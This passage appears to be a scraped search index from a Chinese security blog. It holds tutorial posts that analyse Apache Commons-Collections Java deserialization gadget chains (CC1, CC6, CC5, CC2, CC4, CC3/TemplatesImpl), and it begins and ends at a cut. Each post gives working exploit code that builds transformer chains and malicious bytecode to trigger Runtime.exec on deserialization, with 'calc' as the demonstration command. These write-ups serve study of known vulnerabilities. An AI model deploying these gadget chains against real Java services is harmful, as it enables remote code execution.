Map\u0026lt;Object,Object\u0026gt; decoratemap = LazyMap.decorate(hashmap,chainedTransformer); // decoratemap.get(Runtime.class); Class clz = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;); Constructor\u0026lt;?\u0026gt; constructor =clz.getDeclaredConstructor(Class.class,Map.class); constructor.setAccessible(true); Object o = constructor.newInstance(Override.class,decoratemap); // System.out.println(o.getClass()); //AnnotationInvocationHandler作为代理类,需要将AnnotationInvocationHandler强转为InvocationHandler,才能调用AnnotationInvocationHandler的invoke方法 InvocationHandler invocationHandler = (InvocationHandler) o; Map proxymap =(Map) Proxy.newProxyInstance(Map.class.getClassLoader(),new Class[]{Map.class},invocationHandler); proxymap.entrySet(); Object ob = constructor.newInstance(Override.class,proxymap); serialize(ob); unserialize(\u0026#34;ser.bin\u0026#34;); } public static void serialize(Object obj) throws IOException { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.bin\u0026#34;)); oos.writeObject(obj); } public static Object unserialize(String Filename) throws IOException, ClassNotFoundException{ ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename)); Object obj = ois.readObject(); return obj; } } 流程图\n1 2 3 4 5 6 7 8 ObjectInputStream.readObject() AnnotationInvocationHandler.readObject() ProxyMap.entrySet() AnnotationInvocationHandler.invoke() LazyMap.get() ChainedTransformer.transform() ConstantTransformer.transform() InvokerTransformer.transform() ","date":"2025-01-03T15:21:54+08:00","image":"https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/%E9%93%BE%E5%AD%90/cc1%E6%AD%A3%E9%93%BE/7_hu5913cd4f38c7546b1d9ada3fa63d7ed0_3285229_120x120_fill_q75_box_smart1.jpg","permalink":"https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/%E9%93%BE%E5%AD%90/cc1%E6%AD%A3%E9%93%BE/","title":"java反序列化之Commons-Collections1-CC1正链"},{"content":"环境搭建 jdk8u_71 Comoons-Collections 3.2.1 前言 先说一说 CC6 链同我们之前 CC1 链的一些不同之处吧，我们当时审计 CC1 链的时候要求是比较严格的。要求的环境为 jdk8u65 与 Commons-Collections 3.2.1\n而我们的 CC6 链，可以不受 jdk 版本制约。\n如果用一句话介绍一下 CC6，那就是 CC6 = CC1 + URLDNS\nCC6 链的前半条链与 CC1 正版链子是一样的，也就是到 LazyMap 链\nLazyMap链 1 2 3 4 5 6 7 8 9 Runtime runtime = Runtime.getRuntime(); InvokerTransformer invokerTransformer = new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;}); HashMap\u0026lt;Object,Object\u0026gt; hashmap = new HashMap\u0026lt;\u0026gt;(); Map\u0026lt;Object,Object\u0026gt; decoratemap = LazyMap.decorate(hashmap,invokerTransformer); //decoratemap.get(Runtime.class); Class\u0026lt;LazyMap\u0026gt; lazyMapClass = LazyMap.class; Method method = lazyMapClass.getDeclaredMethod(\u0026#34;get\u0026#34;,Object.class); method.setAccessible(true); method.invoke(decoratemap,runtime); 成功弹计算器\nTiedMapEntry.getValue触发get 然后找调用了get方法的类\n链子的下一步是TiedMapEntry的getValue调用了LazyMap的get()方法\n看构造方法是public,这里map-\u0026gt;LazyMap,value-\u0026gt;Runtime.class\n这里可以不需要通过反射来获取方法\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;, new Class[]{String.class, Class[].class}, new Object[]{\u0026#34;getRuntime\u0026#34;, null}), new InvokerTransformer(\u0026#34;invoke\u0026#34;, new Class[]{Object.class, Object[].class}, new Object[]{null, null}), new InvokerTransformer(\u0026#34;exec\u0026#34;, new Class[]{String.class}, new Object[]{\u0026#34;calc\u0026#34;}) }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); HashMap\u0026lt;Object, Object\u0026gt; hashMap = new HashMap\u0026lt;\u0026gt;(); HashMap\u0026lt;Object,Object\u0026gt; hashmap = new HashMap\u0026lt;\u0026gt;(); Map\u0026lt;Object,Object\u0026gt; decoratemap = LazyMap.decorate(hashmap,chainedTransformer); // decoratemap.get(Runtime.class); // Class\u0026lt;LazyMap\u0026gt; lazyMapClass = LazyMap.class; // Method method = lazyMapClass.getDeclaredMethod(\u0026#34;get\u0026#34;,Object.class); // method.setAccessible(true); // method.invoke(decoratemap,runtime); //因为有ConstantTransformer在,所以key不一定要Runtime.class TiedMapEntry tiedMapEntry = new TiedMapEntry(decoratemap,123); tiedMapEntry.getValue(); 成功弹了\nTiedMapEntry.hashCode触发getValue 因为getValue的方法相当常见,寻找同名类的其他调用getValue的方法\n找到还是TiedMapEntry类的hashCode方法,这里调用了getValue\n之前说cc6=cc1+URLDNS,而hashCode刚好是URLDNS链的入口\n1 tiedMapEntry.hashCode(); 运行后成功弹计算器\nHashMap.hash触发hashCode 后面的链子就是HashMap的hash\nHashMap.put触发hash HashMap的put\n\\\n为什么readObject都没有put,这里用put?因为 在 Java 的反序列化过程中，HashMap 会自动调用 put 方法来恢复数据结构 ,而且hash(key)是从put(key,value)传进来的\n所以put-\u0026gt;hash hash-\u0026gt;hashCode是常见的HashMap的链子\n1 2 HashMap\u0026lt;Object,Object\u0026gt; map = new HashMap\u0026lt;\u0026gt;(); map.put(tiedMapEntry,\u0026#34;123\u0026#34;); 这样可以弹\nexp 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;, new Class[]{String.class, Class[].class}, new Object[]{\u0026#34;getRuntime\u0026#34;, null}), new InvokerTransformer(\u0026#34;invoke\u0026#34;, new Class[]{Object.class, Object[].class}, new Object[]{null, null}), new InvokerTransformer(\u0026#34;exec\u0026#34;, new Class[]{String.class}, new Object[]{\u0026#34;calc\u0026#34;}) }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); HashMap\u0026lt;Object, Object\u0026gt; hashMap = new HashMap\u0026lt;\u0026gt;(); HashMap\u0026lt;Object,Object\u0026gt; hashmap = new HashMap\u0026lt;\u0026gt;(); Map\u0026lt;Object,Object\u0026gt; lazymap = LazyMap.decorate(hashmap,chainedTransformer); // decoratemap.get(Runtime.class); // Class\u0026lt;LazyMap\u0026gt; lazyMapClass = LazyMap.class; // Method method = lazyMapClass.getDeclaredMethod(\u0026#34;get\u0026#34;,Object.class); // method.setAccessible(true); // method.invoke(decoratemap,runtime); //因为有ConstantTransformer在,所以key不一定要Runtime.class TiedMapEntry tiedMapEntry = new TiedMapEntry(lazymap,123); // tiedMapEntry.hashCode(); HashMap\u0026lt;Object,Object\u0026gt; map = new HashMap\u0026lt;\u0026gt;(); map.put(tiedMapEntry,\u0026#34;123\u0026#34;); serialize(map); unserialize(\u0026#34;ser.bin\u0026#34;); 问题一 但是注释掉反序列化代码,序列化的时候也会弹出计算器\n原因\n序列化的时候put就会进入hash从而走一遍链子触发弹计算器\n解决\n先将假的LazyMap放进去,put完后再通过反射修改属性值将正确的LazyMap放到factory\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;, new Class[]{String.class, Class[].class}, new Object[]{\u0026#34;getRuntime\u0026#34;, null}), new InvokerTransformer(\u0026#34;invoke\u0026#34;, new Class[]{Object.class, Object[].class}, new Object[]{null, null}), new InvokerTransformer(\u0026#34;exec\u0026#34;, new Class[]{String.class}, new Object[]{\u0026#34;calc\u0026#34;}) }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); HashMap\u0026lt;Object, Object\u0026gt; hashMap = new HashMap\u0026lt;\u0026gt;(); HashMap\u0026lt;Object,Object\u0026gt; hashmap = new HashMap\u0026lt;\u0026gt;(); //给假的 Map\u0026lt;Object,Object\u0026gt; lazymap = LazyMap.decorate(hashmap,new ConstantTransformer(\u0026#34;1\u0026#34;)); //因为有ConstantTransformer在,所以key不一定要Runtime.class TiedMapEntry tiedMapEntry = new TiedMapEntry(lazymap,123); //tiedMapEntry.hashCode(); HashMap\u0026lt;Object,Object\u0026gt; map = new HashMap\u0026lt;\u0026gt;(); map.put(tiedMapEntry,\u0026#34;123\u0026#34;); Class c = LazyMap.class; Field field = c.getDeclaredField(\u0026#34;factory\u0026#34;); field.setAccessible(true); field.set(lazymap,chainedTransformer); serialize(map); 问题二 序列化不会弹计算器\n但反序列化也不会弹计算器\n原因\n调试时发现\nkey不等于false,不会进入链子\n解决\n通过remove将传入的\u0026quot;abc\u0026quot;去掉\n最终exp 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;, new Class[]{String.class, Class[].class}, new Object[]{\u0026#34;getRuntime\u0026#34;, null}), new InvokerTransformer(\u0026#34;invoke\u0026#34;, new Class[]{Object.class, Object[].class}, new Object[]{null, null}), new InvokerTransformer(\u0026#34;exec\u0026#34;, new Class[]{String.class}, new Object[]{\u0026#34;calc\u0026#34;}) }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); HashMap\u0026lt;Object, Object\u0026gt; hashMap = new HashMap\u0026lt;\u0026gt;(); HashMap\u0026lt;Object,Object\u0026gt; hashmap = new HashMap\u0026lt;\u0026gt;(); //给假的 Map\u0026lt;Object,Object\u0026gt; lazymap = LazyMap.decorate(hashmap,new ConstantTransformer(\u0026#34;1\u0026#34;)); //因为有ConstantTransformer在,所以key不一定要Runtime.class TiedMapEntry tiedMapEntry = new TiedMapEntry(lazymap,\u0026#34;abc\u0026#34;); // tiedMapEntry.hashCode(); HashMap\u0026lt;Object,Object\u0026gt; map = new HashMap\u0026lt;\u0026gt;(); map.put(tiedMapEntry,\u0026#34;123\u0026#34;); lazymap.remove(\u0026#34;abc\u0026#34;); Class c = LazyMap.class; Field field = c.getDeclaredField(\u0026#34;factory\u0026#34;); field.setAccessible(true); field.set(lazymap,chainedTransformer); serialize(map); unserialize(\u0026#34;ser.bin\u0026#34;); 问题三 在序列化前打断点,调试的时候会弹出计算器\n因为在 IDEA 进行 debug 调试的时候，为了展示对象的集合，会自动调用 toString() 方法，所以在创建 TiedMapEntry 的时候，就自动调用了 getValue() 最终将链子走完，然后弹出计算器。\n解决\n在 IDEA 的偏好设置当中如图修改即可。\n总结 流程图\n链子\n1 2 3 4 5 6 7 8 9 ObjectInputStream.readObject HashMap.readObject HashMap.put HashMap.hash TiedMapEntry.hashCode TiedMapEntry.getValue LazyMap.get ChainedTransformer.transformer InvokerTransformer.transformer ","date":"2025-01-03T15:21:45+08:00","image":"https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/%E9%93%BE%E5%AD%90/cc6/12_hu7f0506060fc6e44da7c9d960749b6fdc_2219880_120x120_fill_q75_box_smart1.jpg","permalink":"https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/%E9%93%BE%E5%AD%90/cc6/","title":"java反序列化之Commons-Collections-CC6链"},{"content":"\n正向分析 入口类是 BadAttributeValueExpException 的 readObject() 方法，这一个倒是不难。关键是后面的。\n逆向思维来看的话，LazyMap.get() 方法被 TiedMapEntry.toString() 所调用，而如果去找谁调用了 toString() 这也太多了，太难找了，我们只能正向分析。\nBadAttributeValueExpException\u0026lt;/font\u0026gt;的readObject\nTiedMapEntry类下的toString\n同类下的getValue\n再找到LazyMap下的get\n后半段是cc1正链的后半部分到LazyMap,直接拿进来\n1 2 3 4 5 6 7 8 9 10 11 12 13 Transformer[] transformers = { new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;, new Class[]{String.class, Class[].class}, new Object[]{\u0026#34;getRuntime\u0026#34;, null}), new InvokerTransformer(\u0026#34;invoke\u0026#34;, new Class[]{Object.class, Object[].class}, new Object[]{null, null}), new InvokerTransformer(\u0026#34;exec\u0026#34;, new Class[]{String.class}, new Object[]{\u0026#34;calc\u0026#34;}), }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); // chainedTransformer.transform(Runtime.class); // System.out.println(transformers[0]); HashMap\u0026lt;Object,Object\u0026gt; hashmap = new HashMap\u0026lt;\u0026gt;(); hashmap.put(\u0026#34;value\u0026#34;,\u0026#34;456\u0026#34;); Map\u0026lt;Object,Object\u0026gt; decoratemap = LazyMap.decorate(hashmap,chainedTransformer); // decoratemap.get(Runtime.class); TiedMapEntry.getValue触发LazyMap.get 1 2 TiedMapEntry tiedMapEntry = new TiedMapEntry(decoratemap,Runtime.class); // tiedMapEntry.toString(); 回到链首 可以看到存在两个toString方法\n当实例化BadAttributeValueExpException传入参数TiedMapEntry后\nval也会得到TiedMapEntry,从而进入链子\n所以需要先给个假的,再通过反射修改val的值\n1 2 3 4 5 BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null); Class c = Class.forName(\u0026#34;javax.management.BadAttributeValueExpException\u0026#34;); Field field = c.getDeclaredField(\u0026#34;val\u0026#34;); field.setAccessible(true); field.set(badAttributeValueExpException,tiedMapEntry); 完整exp 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 Transformer[] transformers = { new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;, new Class[]{String.class, Class[].class}, new Object[]{\u0026#34;getRuntime\u0026#34;, null}), new InvokerTransformer(\u0026#34;invoke\u0026#34;, new Class[]{Object.class, Object[].class}, new Object[]{null, null}), new InvokerTransformer(\u0026#34;exec\u0026#34;, new Class[]{String.class}, new Object[]{\u0026#34;calc\u0026#34;}), }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); // chainedTransformer.transform(Runtime.class); // System.out.println(transformers[0]); HashMap\u0026lt;Object,Object\u0026gt; hashmap = new HashMap\u0026lt;\u0026gt;(); hashmap.put(\u0026#34;value\u0026#34;,\u0026#34;456\u0026#34;); Map\u0026lt;Object,Object\u0026gt; decoratemap = LazyMap.decorate(hashmap,chainedTransformer); // decoratemap.get(Runtime.class); TiedMapEntry tiedMapEntry = new TiedMapEntry(decoratemap,Runtime.class); // tiedMapEntry.toString(); BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null); Class c = Class.forName(\u0026#34;javax.management.BadAttributeValueExpException\u0026#34;); Field field = c.getDeclaredField(\u0026#34;val\u0026#34;); field.setAccessible(true); field.set(badAttributeValueExpException,tiedMapEntry); serialize(badAttributeValueExpException); unserialize(\u0026#34;ser.bin\u0026#34;); 流程图 1 2 3 4 5 6 7 BadAttributeValueExpException.readObject() TiedMapEntry.toString() TiedMapEntry.getValue() LazyMap.get() ChainedTransformer.transform() ConstantTransformer.transform() InvokerTransformer.transform() ","date":"2025-01-03T15:21:39+08:00","image":"https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/%E9%93%BE%E5%AD%90/cc5/11_hudcb513bef0ec34084044ec1d01500df8_147529_120x120_fill_q75_box_smart1.jpg","permalink":"https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/%E9%93%BE%E5%AD%90/cc5/","title":"java反序列化之Commons-Collections-CC5链"},{"content":"链子图 cc2链就是如何将InstatiateTransformer和InvokeTransformer以及\nInvokeTransformer和TemplatesImpl串一起\nInstatiateTransformer和InvokeTransformer transformer赋值为InvokerTransformer\nInvokeTransformer和TemplatesImpl InvokeTransformer的transformer是将通过反射,\n这里可以反射调用TemplatesImpl的newTransformer从而串在一起\n怎么将TemplatesImpl传入?\nadd传入的会作为transform的参数\n要调用到TemplatesImpl.newTransformer,add要传入TemplatesImpl的对象\n1 2 priorityQueue.add(templates); priorityQueue.add(templates); 完整exp\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 TemplatesImpl templates = new TemplatesImpl(); Class templatesClass = templates.getClass(); Field nameField = templatesClass.getDeclaredField(\u0026#34;_name\u0026#34;); nameField.setAccessible(true); nameField.set(templates,\u0026#34;Y9sR\u0026#34;); Field bytecodesField = templatesClass.getDeclaredField(\u0026#34;_bytecodes\u0026#34;); bytecodesField.setAccessible(true); byte[] evil = Files.readAllBytes(Paths.get(\u0026#34;E://calc.class\u0026#34;)); byte[][] codes = {evil}; bytecodesField.set(templates,codes); InvokerTransformer invokerTransformer = new InvokerTransformer\u0026lt;\u0026gt;(\u0026#34;newTransformer\u0026#34;,new Class[]{},new Object[]{}); // invokerTransformer.transform(templates); TransformingComparator transformingComparator = new TransformingComparator(new ConstantTransformer(1)); PriorityQueue priorityQueue = new PriorityQueue\u0026lt;\u0026gt;(transformingComparator); priorityQueue.add(templates); priorityQueue.add(templates); Class c = TransformingComparator.class; Field field1 = c.getDeclaredField(\u0026#34;transformer\u0026#34;); field1.setAccessible(true); field1.set(transformingComparator,invokerTransformer); // serialize(priorityQueue); unserialize(\u0026#34;ser.bin\u0026#34;); 但是弹不了,很奇怪,调试的时候能进入TemplatesImpl的defineClass\n流程 1 2 3 4 5 6 7 8 9 10 11 12 PriorityQueue.readObject() PriorityQueue.heapify() PriorityQueue.siftDown() PriorityQueue.siftDownUsingComparator() TransformingComparator.compare() InvokerTransformer.transform() TemplatesImpl.newTransformer() TemplatesImpl.getTransletInstance() TemplatesImpl.defineTransletClasses() TemplatesImpl.defineClass() ClassLoader.defineClass() newInstance ","date":"2025-01-03T15:21:33+08:00","image":"https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/%E9%93%BE%E5%AD%90/cc2/8_huf0a7bf85ca933339987e45feafcb5a5e_534423_120x120_fill_q75_box_smart1.jpg","permalink":"https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/%E9%93%BE%E5%AD%90/cc2/","title":"java反序列化之Commons-Collections-CC2链"},{"content":"环境 JDK8u65 Maven 3.6.3 Commons-Collections 4.0 1 2 3 4 5 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.apache.commons\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;commons-collections4\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;4.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; CC4链分析 从尾部向首部分析，尾部命令执行的方式就两种，反射或是动态加载字节码。因为 CC4 链上只是去掉了 InvokerTransformer 的 Serializable 继承，所以最后的命令执行不受影响。 既然 InvokerTransformer 这里用不了了，我们去找谁调用了 transform() 方法，这里我去找的是 InstantiateTransformer 类，因为它上一步是 InvokerTransformer。\n进行 find usages，在 TransformingComparator 这个类中的 compare() 方法调用了 transform() 方法。而 compare() 这个方法也是我们比较喜欢的这种，因为它非常常见。\n找到PriorityQueue类\n在同一个类找下去\n最后找到readObject首部\n刚好继承了序列化接口\n和cc3尾部链子到InstantiateTransformer.transform()后面都是同一条链子\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 TemplatesImpl templates = new TemplatesImpl(); Class templatesclass = templates.getClass(); Field name = templatesclass.getDeclaredField(\u0026#34;_name\u0026#34;); name.setAccessible(true); name.set(templates,\u0026#34;Y9sR\u0026#34;); Field codes = templatesclass.getDeclaredField(\u0026#34;_bytecodes\u0026#34;); codes.setAccessible(true); byte[] evil = Files.readAllBytes(Paths.get(\u0026#34;E:\\\\javawork\\\\cc3\\\\src\\\\main\\\\java\\\\cc3\\\\calc.class\u0026#34;)); //{}包含一个数组的数组 byte[][] code = {evil}; codes.set(templates,code); Field field = templatesclass.getDeclaredField(\u0026#34;_tfactory\u0026#34;); field.setAccessible(true); field.set(templates,new TransformerFactoryImpl()); // templates.newTransformer(); Class\u0026lt;TrAXFilter\u0026gt; trAXFilter = TrAXFilter.class; InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templates} ); // instantiateTransformer.transform(trAXFilter); Transformer[] transformers = { new ConstantTransformer(TrAXFilter.class),instantiateTransformer, instantiateTransformer }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); TransformingComparator transformingComparator = new TransformingComparator(chainedTransformer); PriorityQueue priorityQueue = new PriorityQueue(transformingComparator); // serialize(priorityQueue); unserialize(\u0026#34;ser.bin\u0026#34;); } 但是弹不了计算器\n问题解决 再readObject和heapify打断点\ndebug的时候看到到heapify没有进for循环,直接跳出程序,没进入到链子\n当给size赋值为2时,结果刚好1-1=0,满足i\u0026gt;=0,能进入循环,所以需要找到size赋值的地方\n加上之后发现序列化运行的时候也会直接弹计算器\n进入add方法\n只需要在add之前给TransformingComparator传入一个无关的东西,add的时候进入不了链子,再通过反射来修改\n最终exp 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 TemplatesImpl templates = new TemplatesImpl(); Class templatesclass = templates.getClass(); Field name = templatesclass.getDeclaredField(\u0026#34;_name\u0026#34;); name.setAccessible(true); name.set(templates,\u0026#34;Y9sR\u0026#34;); Field codes = templatesclass.getDeclaredField(\u0026#34;_bytecodes\u0026#34;); codes.setAccessible(true); byte[] evil = Files.readAllBytes(Paths.get(\u0026#34;E:\\\\javawork\\\\cc3\\\\src\\\\main\\\\java\\\\cc3\\\\calc.class\u0026#34;)); //{}包含一个数组的数组 byte[][] code = {evil}; codes.set(templates,code); Field field = templatesclass.getDeclaredField(\u0026#34;_tfactory\u0026#34;); field.setAccessible(true); field.set(templates,new TransformerFactoryImpl()); // templates.newTransformer(); Class\u0026lt;TrAXFilter\u0026gt; trAXFilter = TrAXFilter.class; InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templates} ); // instantiateTransformer.transform(trAXFilter); Transformer[] transformers = { new ConstantTransformer(TrAXFilter.class),instantiateTransformer, instantiateTransformer }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); TransformingComparator transformingComparator = new TransformingComparator(new ConstantTransformer(1)); PriorityQueue priorityQueue = new PriorityQueue(transformingComparator); priorityQueue.add(1); priorityQueue.add(2); Class c = TransformingComparator.class; Field field1 = c.getDeclaredField(\u0026#34;transformer\u0026#34;); field1.setAccessible(true); field1.set(transformingComparator,chainedTransformer); serialize(priorityQueue); unserialize(\u0026#34;ser.bin\u0026#34;); 成功弹计算器\n流程图 1 2 3 4 5 6 7 8 9 10 11 12 13 14 PriorityQueue.readObject() PriorityQueue.heapify() PriorityQueue.siftDown() PriorityQueue.siftDownUsingComparator() TransformingComparator.compare() //后面就是cc3链的后半部分 InstantiateTransformer.transform() TrAXFilter.TrAXFilter() TemplatesImpl.newTransformer() TemplatesImpl.getTransletInstance() TemplatesImpl.defineTransletClasses() TemplatesImpl.defineClass() ClassLoader.defineClass() newInstance ","date":"2025-01-03T15:21:30+08:00","image":"https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/%E9%93%BE%E5%AD%90/cc4/10_hue3933a2baba93b632a9ce45c6cb3a05b_145366_120x120_fill_q75_box_smart1.jpg","permalink":"https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/%E9%93%BE%E5%AD%90/cc4/","title":"java反序列化之Commons-Collections-CC4链"},{"content":"字节码加载知识 利用 ClassLoader#defineClass 直接加载字节码的手段。 在这一条小链子当中，流程图可以绘制如下。\n这里我们可以正向看，首先是 loadClass()，它的作用是从已加载的类缓存、父加载器等位置寻找类（这里实际上是双亲委派机制），在前面没有找到的情况下，执行 findClass()。\n对于 findClass() 方法\n根据名称或位置加载 .class 字节码,然后使用 defineClass，代码实例如下。 通常由子类去实现 JAVA\n1 2 3 4 5 protected Class\u0026lt;?\u0026gt; findClass(String name) throws ClassNotFoundException { throw new ClassNotFoundException(name); } // findClass 方法的源代码 1 2 3 4 5 6 7 8 9 10 11 12 13 14 class NetworkClassLoader extends ClassLoader { String host; int port; public Class findClass(String name) { byte[] b = loadClassData(name); return defineClass(name, b, 0, b.length); } private byte[] loadClassData(String name) { // load the class data from the connection } } // 子类的实现方式 defineClass() 的作用是处理前面传入的字节码，将其处理成真正的 Java 类。 此时的 defineClass() 方法是有局限性的，因为它只是加载类，并不执行类。若需要执行，则需要先进行 newInstance() 的实例化。\n现在我们的 defineClass() 方法的作用域为 protected，我们需要找到作用域为 public 的类，方便我们利用。照样 find usages\nTemplatesImpl 解析 这里的 defineClass() 方法没有标注作用域，默认为 defalut，也就是说自己的类里面可以调用，我们继续 find usages\n在同类下找到defineTransletClass方法中看到调用了defineClass\n还是private,继续找调用defineTransletClass\n以上三个方法都调用了defineTransletClass,为什么选择它?\n因为其调用了 defineTransletClasses() 方法，并且这里有一个 newInstance() 实例化的过程，如果能走完这个函数那么就能动态执行代码，但是因为它是私有的，所以继续找。\n找到public修饰的newTransformer方法,接下就是处理限制条件了\n_bytecodes解决 _bytecodes 的值，这里需要的是一个二维数组，所以我们创建一个二维数组。但是 _bytecodes 作为传递进 defineClass 方法的值是一个一维数组。而这个一维数组里面我们需要存放恶意的字节码。这一段伪代码可以这样写。\n先写个恶意类并编译\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 package cc3; import java.io.IOException; public class calc { //静态代码块实例化的时候会自动运行 static { try { Runtime.getRuntime().exec(\u0026#34;calc\u0026#34;); } catch (IOException e) { e.printStackTrace(); } } } 1 2 3 byte[] evil = Files.readAllBytes(Paths.get(\u0026#34;E:\\\\javawork\\\\cc3\\\\src\\\\main\\\\java\\\\cc3\\\\calc.class\u0026#34;)); //{}包含一个数组的数组 byte[][] code = {evil}; _tfactory解决 transient保证了这个变量在序列化之后无法被访问\n在 readObject() 方法中，找到了 _tfactory 的初始化定义。\n刚好能在反序列化的时候初始化,就能让_tfactory值不为null\n通过反射修改\n1 2 3 Field field = templatesclass.getDeclaredField(\u0026#34;_tfactory\u0026#34;); field.setAccessible(true); field.set(templates,new TransformerFactoryImpl()); 前面的_name和_bytecodes也是通过反射来修改\n完整exp 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 TemplatesImpl templates = new TemplatesImpl(); Class templatesclass = templates.getClass(); Field name = templatesclass.getDeclaredField(\u0026#34;_name\u0026#34;); name.setAccessible(true); name.set(templates,\u0026#34;Y9sR\u0026#34;); Field codes = templatesclass.getDeclaredField(\u0026#34;_bytecodes\u0026#34;); codes.setAccessible(true); byte[] evil = Files.readAllBytes(Paths.get(\u0026#34;E:\\\\javawork\\\\cc3\\\\src\\\\main\\\\java\\\\cc3\\\\calc.class\u0026#34;)); //{}包含一个数组的数组 byte[][] code = {evil}; codes.set(templates,code); Field field = templatesclass.getDeclaredField(\u0026#34;_tfactory\u0026#34;); field.setAccessible(true); field.set(templates,new TransformerFactoryImpl()); templates.newTransformer(); 运行完但是不弹计算器且报错\n空指针报错\n看报错是在422行空指针报错,打了断点\n死在了else这里\n这里要么_auxClasses赋值,要么if判断正确不进入else\n如果给_auxClasses赋值,在下面的if判断时,\u0026lt;0会抛出异常\n所以这里让上面的if判断正确好点\n分析for这里的代码\n1 2 3 4 5 6 7 8 9 _class[i] = loader.defineClass(_bytecodes[i]); //_class这里会得到_bytecodes的字节码加载的类 final Class superClass = _class[i].getSuperclass(); //这里是得到_bytescodes类的父类 // Check if this is the main class if (superClass.getName().equals(ABSTRACT_TRANSLET)) { //判断字节码的类是否继承了ABSTRACT_TRANSLET _transletIndex = i; } 所以只需要给我们的恶意类加上继承AbstractTranslet\n重新编译一下calc.java运行后弹计算器\nCC1 链的 TemplatesImpl 的实现方式 \u0026lt;font style=\u0026quot;color:rgb(80, 80, 92);background-color:rgb(247, 247, 247);\u0026quot;\u0026gt;TemplatesImpl 只是将原本的命令执行变成代码执行的方式所以在不考虑黑名单的情况下，如果可以进行命令执行，则一定可以通过动态加载字节码进行代码执行。\u0026lt;/font\u0026gt;\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 TemplatesImpl templates = new TemplatesImpl(); Class templatesclass = templates.getClass(); Field name = templatesclass.getDeclaredField(\u0026#34;_name\u0026#34;); name.setAccessible(true); name.set(templates,\u0026#34;Y9sR\u0026#34;); Field codes = templatesclass.getDeclaredField(\u0026#34;_bytecodes\u0026#34;); codes.setAccessible(true); byte[] evil = Files.readAllBytes(Paths.get(\u0026#34;E:\\\\javawork\\\\cc3\\\\src\\\\main\\\\java\\\\cc3\\\\calc.class\u0026#34;)); //{}包含一个数组的数组 byte[][] code = {evil}; codes.set(templates,code); Field field = templatesclass.getDeclaredField(\u0026#34;_tfactory\u0026#34;); field.setAccessible(true); field.set(templates,new TransformerFactoryImpl()); // templates.newTransformer(); Transformer[] transformers = new Transformer[]{ new ConstantTransformer(templates), new InvokerTransformer(\u0026#34;newTransformer\u0026#34;, null, null), }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); chainedTransformer.transform(templates); 能弹计算器\n后面的链子都是正常用cc1的\n完整exp 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 TemplatesImpl templates = new TemplatesImpl(); Class templatesclass = templates.getClass(); Field name = templatesclass.getDeclaredField(\u0026#34;_name\u0026#34;); name.setAccessible(true); name.set(templates,\u0026#34;Y9sR\u0026#34;); Field codes = templatesclass.getDeclaredField(\u0026#34;_bytecodes\u0026#34;); codes.setAccessible(true); byte[] evil = Files.readAllBytes(Paths.get(\u0026#34;E:\\\\javawork\\\\cc3\\\\src\\\\main\\\\java\\\\cc3\\\\calc.class\u0026#34;)); //{}包含一个数组的数组 byte[][] code = {evil}; 